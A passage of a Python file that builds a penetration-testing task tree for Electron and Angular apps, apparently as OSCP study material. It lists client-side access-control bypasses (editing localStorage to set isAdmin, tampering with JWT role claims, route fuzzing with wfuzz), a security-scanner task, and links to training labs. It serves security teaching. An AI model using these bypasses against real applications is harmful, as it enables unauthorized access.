                    'Check lazy-loaded modules: Look for loadChildren in routing config (may expose additional routes)',
                    'Modify localStorage/sessionStorage: Set isAdmin=true or role=admin and refresh',
                    'Tamper with JWT: Decode JWT (jwt.io), check for role claim, modify if not signed server-side'
                ],
                'alternatives': [
                    'Fuzz routes: wfuzz -w /usr/share/wordlists/dirb/common.txt https://target.com/FUZZ',
                    'Angular route discovery: grep -r "path:" src/ (if source maps available)',
                    'Browser storage manipulation: localStorage.setItem("isAdmin", true)',
                    'Disable JavaScript: Some client-side guards fail if JS disabled (rare)',
                    'Direct API calls: Bypass UI and call Angular backend APIs directly'
                ],
                'notes': 'CLIENT-SIDE ACCESS CONTROL IS NOT SECURITY. Always verify authorization server-side. Angular route guards are for UX only. Common mistake: Only checking canActivate client-side without server validation.'
            }
        })

        tasks['children'].append(angular_tasks)

        # ========================================
        # PART 3: GENERAL TOOLS AND RESOURCES
        # ========================================
        tools_tasks = {
            'id': 'electron-angular-tools',
            'name': 'Security Tools & Resources',
            'type': 'parent',
            'children': []
        }

        # 3.1 Automated Security Scanners
        tools_tasks['children'].append({
            'id': 'electron-security-scanners',
            'name': 'Automated Electron Security Scanning',
            'type': 'command',
            'metadata': {
                'command': 'npm install -g @doyensec/electronegativity && electronegativity -i /path/to/electron/app',
                'description': 'Scan Electron app for security misconfigurations and anti-patterns',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'TOOL'],
                'flag_explanations': {
                    '@doyensec/electronegativity': 'Electron security scanner by Doyensec',
                    '-i': 'Input directory (path to extracted Electron app)',
                    '-o': 'Output file for report',
                    '-v': 'Verbose output',
                    '-s': 'Severity threshold (low, medium, high)',
                    '-c': 'Custom configuration file'
                },
                'success_indicators': [
                    'Security issues found and reported',
                    'nodeIntegration misconfigurations detected',
                    'Dangerous IPC patterns identified',
                    'CSP policy weaknesses found',
                    'Outdated Electron version flagged'
                ],
                'failure_indicators': [
                    'No issues found (app well-secured)',
                    'Tool fails on obfuscated code',
                    'False negatives (manual review still needed)',
                    'Cannot parse minified JavaScript'
                ],
                'next_steps': [
                    'Review all HIGH severity findings first',
                    'Manually verify each finding (tools have false positives)',
                    'Test exploitability of each issue',
                    'Check for vulnerable dependencies: npm audit',
                    'Scan with additional tools: electrolint, nodejsscan'
                ],
                'alternatives': [
                    'electrolint (VS Code plugin): Install in VS Code for real-time scanning',
                    'nodejsscan: pip install nodejsscan && nodejsscan -d /path/to/app',
                    'npm audit: npm audit (check package.json dependencies)',
                    'retire.js: retire --path /path/to/app (check for vulnerable JS libraries)',
                    'Manual grep: grep -r "nodeIntegration.*true\\|contextIsolation.*false" /path/to/app'
                ],
                'notes': 'Electronegativity is the industry standard for Electron security scanning. Install globally: npm install -g @doyensec/electronegativity. Run on extracted ASAR or source code. Combine with manual review for comprehensive assessment.'
            }
        })

        # 3.2 Training Labs and Resources
        tools_tasks['children'].append({
            'id': 'electron-angular-training',
            'name': 'Training Labs & Resources',
            'type': 'manual',
            'metadata': {
                'description': 'Vulnerable Electron/Angular apps for practice and skill development',
                'tags': ['OSCP:LOW', 'TRAINING', 'REFERENCE'],
                'flag_explanations': {
                    'vulnerable1.zip': 'Vulnerable to nodeIntegration RCE',
                    'vulnerable2.zip': 'Vulnerable to contextIsolation bypass',
                    'vulnerable3.zip': 'Vulnerable to IPC RCE',
                    'DVWA': 'Damn Vulnerable Web Application (includes Angular challenges)',
                    'PortSwigger Web Security Academy': 'Free labs for client-side vulnerabilities'
                },
                'success_indicators': [
                    'Successfully exploited training app',
                    'RCE achieved in controlled environment',
                    'Understanding of Electron attack surface',
                    'Able to identify misconfigurations in real apps'
                ],
                'failure_indicators': [
                    'Unable to exploit training app',
                    'Lack of understanding of Electron internals',
                    'Need more practice with XSS/SSTI/prototype pollution'
                ],
                'next_steps': [
                    'Download vulnerable apps from links in notes',
                    'Setup labs locally: npm install && npm start',
                    'Practice each vulnerability type systematically',
                    'Document exploitation steps for exam prep',
                    'Watch training videos (links in notes)',
                    'Join Electron security community: https://github.com/doyensec/awesome-electronjs-hacking'
                ],
                'alternatives': [
                    'Create your own vulnerable app: npx create-electron-app test-app',
                    'Analyze real-world Electron apps: Discord, Slack, VS Code, Signal, 1Password',
                    'Read CVE write-ups: Search for Electron CVEs on GitHub',
                    'PortSwigger Web Security Academy: Free Angular/XSS/SSTI labs',
                    'HackTheBox / DVWA: Practice general web security'
                ],
                'notes': 'Training resources:\n\n1. Vulnerable Electron Apps:\n   - https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip (nodeIntegration RCE)\n   - https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip (contextIsolation bypass)\n   - https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip (IPC RCE)\n\n2. Training Videos:\n   - https://www.youtube.com/watch?v=xILfQGkLXQo (Electron security lab walkthrough)\n   - https://www.youtube.com/watch?v=a-YnG3Mx-Tg (Electron RCE techniques)\n\n3. Reading Material:\n   - https://github.com/doyensec/awesome-electronjs-hacking (curated security resources)\n   - https://www.electronjs.org/docs/latest/tutorial/security (official security guide)\n   - https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html (API misuse patterns)\n\n4. Angular Security:\n   - https://angular.io/guide/security (official Angular security guide)\n   - https://lsgeurope.com/post/angular-security-checklist (comprehensive checklist)\n   - PortSwigger Web Security Academy (free labs)'
            }
        })

        tasks['children'].append(tools_tasks)

        return tasks
